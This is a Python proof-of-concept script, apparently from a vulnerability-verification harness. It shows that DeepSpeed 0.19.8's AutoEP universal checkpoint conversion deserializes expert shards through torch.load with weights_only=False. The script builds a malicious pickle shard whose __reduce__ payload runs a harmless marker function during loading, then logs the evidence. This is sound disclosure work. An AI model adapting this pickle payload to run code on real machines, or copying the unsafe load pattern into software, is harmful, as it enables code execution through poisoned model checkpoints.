"""DeepSpeed 0.19.8 AutoEP universal conversion loads expert shards unsafely.

The PoC imports the real vendored v0.19.8 `autoep_universal` module, writes a
malicious expert checkpoint, and calls `consolidate_autoep_expert_files`.
The marker is written inside the upstream `torch.load(weights_only=False)`
before the subsequent expected-key validation fails.
"""

from __future__ import annotations

import json
import pickle
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
import poclib  # noqa: E402

UPSTREAM = poclib.UPSTREAM / "deepspeed-0.19.8"
sys.path.insert(0, str(UPSTREAM))


class Payload:
    def __init__(self, marker_text: str):
        self.marker_text = marker_text

    def __reduce__(self):
        return (poclib.mark, (self.marker_text,))


def main() -> None:
    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    source = UPSTREAM / "deepspeed/checkpoint/autoep_universal.py"
    if not source.is_file():
        poclib.fail(f"missing pinned upstream source: {source}")

    poclib.start_marker()
    import torch

    try:
        from deepspeed.checkpoint import autoep_universal  # real vendored v0.19.8 module
    except Exception as exc:  # pragma: no cover - diagnostic
        poclib.fail(f"cannot import vendored autoep_universal: {type(exc).__name__}: {exc}")

    work = poclib.EVIDENCE_DIR / "work"
    ckpt = work / "ckpt"
    out = work / "out"
    ckpt.mkdir(parents=True, exist_ok=True)
    out.mkdir(parents=True, exist_ok=True)
    shard = ckpt / "layer_0_expert_0_mp_rank_0_model_states.pt"
    shard.write_bytes(pickle.dumps(Payload(poclib.MARKER_TEXT), protocol=4))

    metadata = [{
        "moe_layer_id": 0,
        "num_experts": 1,
        "expert_key_prefix": "model.layers.0.mlp.experts",
        "num_local_experts": 1,
        "ep_size": 1,
    }]

    post_sink_error = None
    try:
        autoep_universal.consolidate_autoep_expert_files(str(ckpt), str(out), metadata)
    except Exception as exc:
        post_sink_error = f"{type(exc).__name__}: {exc}"

    if not poclib.marker_ok():
        poclib.fail("marker was not written inside the upstream weights_only=False load",
                    post_sink_error=post_sink_error)

    log = [
        f"upstream={poclib.rel(source)}",
        f"module={autoep_universal.__file__}",
        f"source_sha256={poclib.sha256_file(source)}",
        f"sink_line={manifest['root_cause']['line']}",
        f"shard={poclib.rel(shard)}",
        "consolidate_autoep_expert_files -> resolve_expert_ckpt_path -> torch.load(weights_only=False)",
        f"post_sink_error={post_sink_error}",
        f"marker={poclib.MARKER_TEXT}",
        f"torch_version={torch.__version__}",
    ]
    (poclib.EVIDENCE_DIR / "log.txt").write_text("\n".join(log) + "\n", encoding="utf-8")

    poclib.finish_verified({
        "transport": {
            "type": "real vendored upstream module + torch.load",
            "upstream": "DeepSpeed v0.19.8",
            "source": poclib.rel(source),
            "source_sha256": poclib.sha256_file(source),
            "sink_line": manifest["root_cause"]["line"],
            "sink": "torch.load(..., weights_only=False)",
            "shard": poclib.rel(shard),
            "payload": "pickle __reduce__ -> poclib.mark",
            "post_sink_error": post_sink_error,
            "torch_version": torch.__version__,
        },
        "request_response": [
            {"step": "consolidate_autoep_expert_files(checkpoint_dir)", "result": "torch.load executed malicious shard"},
            {"step": "expected key validation", "result": f"failed after proof: {post_sink_error}"},
        ],
        "state_before": "marker=ABSENT",
        "state_after": "marker contains proof text",
    })


if __name__ == "__main__":
    main()
